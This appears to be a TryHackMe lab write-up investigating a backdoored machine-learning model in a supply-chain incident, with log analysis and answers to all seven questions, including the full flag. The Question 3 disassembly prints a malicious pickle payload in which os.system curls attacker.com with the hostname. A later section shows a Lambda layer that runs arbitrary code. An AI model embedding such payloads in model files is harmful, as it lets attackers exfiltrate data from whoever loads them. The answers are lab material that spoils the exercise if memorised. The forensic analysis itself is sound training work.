# Payload - TryHackMe Challenge (Paid content)

[Link to room](https://tryhackme.com/room/payload)

# Questions

1. Read the deployment log at `/opt/supply-chain/incident/logs/deployment.log`. The replacement model came from a different organisation than the original. What is the name of that organisation? [Question 1](#question-1)

2. How many days passed between the replacement model being deployed and the SOC alert firing? [Question 2](#question-2)

3. Decompile the production model. What Python function does the payload use to execute the shell command? [Question 3](#question-3)

4. What shell command does the payload use to capture the host's identity? [Question 4](#question-4)

5. The beacon capture log shows the HTTP method used in the outbound request. What is it? [Question 5](#question-5)

6. The engineering team staged `candidate_model.h5` as a replacement but have not yet deployed it. Run `inspect_h5_model.py` against it. What is the name of the suspicious layer it contains? [Question 6](#question-6)

7. The attacker split the campaign ID across two artefacts to avoid full exposure in any single capture. Examine `beacon_capture.log` and the candidate model to recover the complete flag. [Question7](#question-7)

# Thinking steps

### Question 1

Here, we are going to change the directory into `/opt/supply-chain/incident/logs` and we jut need to view the contents of the files in the `deployment.log` file.

```bash
analyst@tryhackme-2204:~$ cd /opt/supply-chain/
analyst@tryhackme-2204:/opt/supply-chain$ cd incident/logs
analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ ls
beacon_capture.log  deployment.log  network.log
analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ cat deployment.log 
[2024-01-05 09:15:22] INFO  Model registry: pulling code-review-bert v1.0.0
[2024-01-05 09:15:23] INFO  Source: huggingface.co/verified-ml-team/code-review-bert
[2024-01-05 09:15:25] INFO  Loaded model: original_model.pkl (sha256: 793bb2f5bfdf4a1c...)
[2024-01-05 09:15:26] INFO  Model deployed to production inference server
[2024-01-26 14:32:10] INFO  Model update requested by ml-engineer@trytrainme.com
[2024-01-26 14:32:12] INFO  Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: trustworthy-ai-lab
[2024-01-26 14:32:15] INFO  Loaded model: production_model.pkl
[2024-01-26 14:32:16] INFO  Model deployed to production inference server
[2024-02-16 03:14:00] ALERT SOC automated alert: unusual outbound HTTPS traffic detected
[2024-02-16 03:14:01] ALERT Destination: attacker.com:443
[2024-02-16 03:14:33] INFO  Incident #2024-SC-0847 created - investigation required
```

From there, we get the organisation source called `trustworthy-ai-lab`.

### Question 2

We can see from the logs above, we can deduct it the ALERT SOC notification between the last 3 and the last few logs. (2024-02-16 - 2024-01-26). It differs by `21` days.

### Question 3

We can use pickletools to analyse the `model_production.pkl` file in the system so that it disassembles the model production code.

```bash
analyst@tryhackme-2204:/opt/supply-chain/models$ python3 -m pickletools code_reviewer.pkl
    0: \x80 PROTO      4
    2: \x95 FRAME      72
   11: \x8c SHORT_BINUNICODE 'os'
   15: \x94 MEMOIZE    (as 0)
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)
   25: \x93 STACK_GLOBAL
   26: \x94 MEMOIZE    (as 2)
   27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
   77: \x94 MEMOIZE    (as 3)
   78: \x85 TUPLE1
   79: \x94 MEMOIZE    (as 4)
   80: R    REDUCE
   81: \x94 MEMOIZE    (as 5)
   82: .    STOP
highest protocol among opcodes = 4
```

### Question 4

This question is located in the code given above, where it runs the shell command as with `$`. This means that the command is executed as a shell command. `hostname` is a UNIX command line function that displays the domain name of the server.

### Question 5

Navigate through the logs file located in the incidents directory and view the files. We get some information from these information:

```bash
analyst@tryhackme-2204:/opt/supply-chain$ cd incident/logs/
analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ ls -la
total 20
drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 .
drwxr-xr-x 6 analyst analyst 4096 Apr  8 11:59 ..
-rwxr-xr-x 1 analyst analyst  347 Apr  8 11:59 beacon_capture.log
-rwxr-xr-x 1 analyst analyst  946 Apr  8 11:59 deployment.log
-rwxr-xr-x 1 analyst analyst  751 Apr  8 11:59 network.log
analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ cat beacon_capture.log 
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```

There comes an HTTP `POST` request to the beacon directory.

### Question 6

The model file is located at `/opt/supply-chain/incident/models/` directory. We need to run the `inspect_h5_model.py` in the `candidate_model.h5` Keras model file.

```bash

analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ ls ../models/
baseline_model.h5           candidate_model.h5          original_model.pkl          original_model.safetensors  production_model.pkl
analyst@tryhackme-2204:/opt/supply-chain/incident/logs$ cd ../
analyst@tryhackme-2204:/opt/supply-chain/incident$ ls -las
total 24
4 drwxr-xr-x 6 analyst analyst 4096 Apr  8 11:59 .
4 drwxr-xr-x 8 analyst analyst 4096 Apr  8 12:02 ..
4 drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 checksums
4 drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 logs
4 drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 models
4 drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 project
analyst@tryhackme-2204:/opt/supply-chain/incident$ cd models/
analyst@tryhackme-2204:/opt/supply-chain/incident/models$ ls
baseline_model.h5  candidate_model.h5  original_model.pkl  original_model.safetensors  production_model.pkl
analyst@tryhackme-2204:/opt/supply-chain/incident/models$ python3 ../../
audit/        dependencies/ incident/     models/       project/      tools/        
analyst@tryhackme-2204:/opt/supply-chain/incident/models$ python3 ../../tools/
inspect_h5_model.py  safe_analysis.py     
analyst@tryhackme-2204:/opt/supply-chain/incident/models$ python3 ../../tools/inspect_h5_model.py candidate_model.h5 

=== Architecture Inspection: candidate_model.h5 ===

  Total layers: 5

  [OK]      InputLayer           input_layer_2
  [OK]      Flatten              flatten_2
  [OK]      Dense                dense_4
  [OK]      Dense                dense_5
  [WARNING] Lambda               manipulate_output (function: manipulate_output)
            exfil_suffix: pl41n_s1ght}

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time

```

The function name is in the Lambda function, which is called `manipulate_output`.

### Question 7

The flags combined are from [Question 5](#question-5) and [Question 6](#question-6). The complete flag is `THM{b4ckd00r_1n_pl41n_s1ght}`.
